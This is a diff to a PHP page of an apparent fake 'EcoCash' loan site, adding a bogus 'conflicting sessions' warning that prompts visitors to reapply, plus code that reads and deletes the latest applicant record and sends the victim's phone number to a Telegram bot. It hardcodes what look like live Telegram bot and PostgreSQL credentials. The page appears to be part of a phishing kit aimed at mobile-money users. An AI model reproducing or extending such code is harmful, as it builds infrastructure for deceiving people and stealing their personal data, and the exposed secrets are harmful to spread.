@@ -1,6 +1,144 @@
 <?php
-// Empty PHP - no backend logic
-// This file is primarily HTML with PHP tags only for file extension
+session_start();
+
+// ========== CONFIGURATION ==========
+$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
+$chatId   = "-5193742613";
+
+// PostgreSQL credentials
+$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
+$dbPort = 5432;
+$dbName = "loan_9d8q";
+$dbUser = "loan_9d8q_user";
+$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
+// ==================================
+
+/**
+ * Get PostgreSQL connection
+ */
+function getDbConnection($host, $port, $dbname, $user, $pass) {
+    static $conn = null;
+    if ($conn === null) {
+        if (!function_exists('pg_connect')) {
+            error_log("PostgreSQL extension (pgsql) is NOT available.");
+            return false;
+        }
+        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
+        $conn = @pg_connect($connString);
+        if (!$conn) {
+            error_log("DB connection failed: " . pg_last_error());
+            return false;
+        }
+    }
+    return $conn;
+}
+
+/**
+ * Send Telegram message
+ */
+function sendTelegramMessage($botToken, $chatId, $message) {
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+    $postData = [
+        'chat_id' => $chatId,
+        'text'    => $message,
+        'parse_mode' => 'Markdown'
+    ];
+    
+    if (function_exists('curl_version')) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => http_build_query($postData),
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_SSL_VERIFYPEER => true,
+            CURLOPT_USERAGENT => 'EcoCashBot/1.0'
+        ]);
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        if ($response !== false && $httpCode === 200) {
+            $result = json_decode($response, true);
+            return isset($result['ok']) && $result['ok'] === true;
+        }
+        return false;
+    }
+    
+    // fallback
+    $options = [
+        'http' => [
+            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+            'method'  => 'POST',
+            'content' => http_build_query($postData),
+            'timeout' => 10,
+            'user_agent' => 'EcoCashBot/1.0'
+        ],
+        'ssl' => ['verify_peer' => true]
+    ];
+    $context = stream_context_create($options);
+    $response = @file_get_contents($url, false, $context);
+    if ($response !== false) {
+        $result = json_decode($response, true);
+        return isset($result['ok']) && $result['ok'] === true;
+    }
+    return false;
+}
+
+// Check if reapply action is triggered
+if (isset($_GET['action']) && $_GET['action'] === 'reapply') {
+    try {
+        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
+        
+        if (!$conn) {
+            throw new Exception("Database connection failed");
+        }
+        
+        // Query to get the last inserted phone number from loan_applications table
+        $selectQuery = "SELECT phone_number FROM loan_applications ORDER BY id DESC LIMIT 1";
+        $result = pg_query($conn, $selectQuery);
+        
+        if ($result && pg_num_rows($result) > 0) {
+            $row = pg_fetch_assoc($result);
+            $lastPhoneNumber = $row['phone_number'];
+            
+            // Delete the record with the last phone number
+            $deleteQuery = "DELETE FROM loan_applications WHERE phone_number = $1 ORDER BY id DESC LIMIT 1";
+            $deleteResult = pg_query_params($conn, $deleteQuery, [$lastPhoneNumber]);
+            
+            if ($deleteResult) {
+                $_SESSION['message'] = "Previous application deleted successfully. You can now reapply.";
+                $_SESSION['message_type'] = "success";
+                
+                // Send Telegram notification about deletion
+                $ip = "https://loan-1-i36j.onrender.com/session_conflict.php";
+                $time = date('Y-m-d H:i:s');
+                $msg = "🔄 *Application Reset*\n\n📱 Phone: +263 {$lastPhoneNumber}\n⏰ Time: {$time}\n📍 Action: Reapply clicked 🌐 Session Page: {$ip}";
+                sendTelegramMessage($botToken, $chatId, $msg);
+            } else {
+                throw new Exception("Error deleting record: " . pg_last_error($conn));
+            }
+        } else {
+            $_SESSION['message'] = "No previous application found. You can proceed with new application.";
+            $_SESSION['message_type'] = "info";
+        }
+        
+        pg_close($conn);
+        
+        // Redirect to loan.php
+        header("Location: loan.php");
+        exit();
+        
+    } catch (Exception $e) {
+        $_SESSION['message'] = "Error: " . $e->getMessage();
+        $_SESSION['message_type'] = "error";
+        error_log("Reapply error: " . $e->getMessage());
+        header("Location: loan.php");
+        exit();
+    }
+}
+
+// If no action parameter, show the warning page
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -277,30 +415,35 @@
                 <div class="conflict-message blink-warning" id="conflictMessage">
                     <div class="oops">OOPS!!</div>
                     <div class="description">
-                        Conflicting sessions detected from your EcoCash app. Please logout app and reapply for a loan.Thanks
+                        Conflicting sessions detected from your EcoCash app. Please logout app and reapply for a loan. Thanks
                     </div>
                 </div>
 
-               
-                
+                <div class="details-list">
+                    <div class="detail-item">
+                        <div class="detail-icon">📱</div>
+                        <div class="detail-text">
+                            <div class="label">Last Application</div>
+                            <div class="value">Previous session didn't close properly</div>
+                        </div>
+                    </div>
                     <div class="detail-item">
                         <div class="detail-icon">⏱️</div>
                         <div class="detail-text">
                             <div class="label">Session Timeout</div>
-                            <div class="value">Previous session didn't close properly</div>
+                            <div class="value">Please reapply to continue</div>
                         </div>
                     </div>
                 </div>
 
                 <div class="warning-actions">
-                    <a href="index.php" class="btn btn-reapply">
+                    <a href="?action=reapply" class="btn btn-reapply">
                         🔄 Reapply for Loan
                     </a>
-                   
                 </div>
 
                 <div class="footer-note">
-                    <span>⚠️ For security reasons, please reapply or logout to continue</span>
+                    <span>⚠️ For security reasons, please reapply to continue</span>
                 </div>
             </div>
         </div>
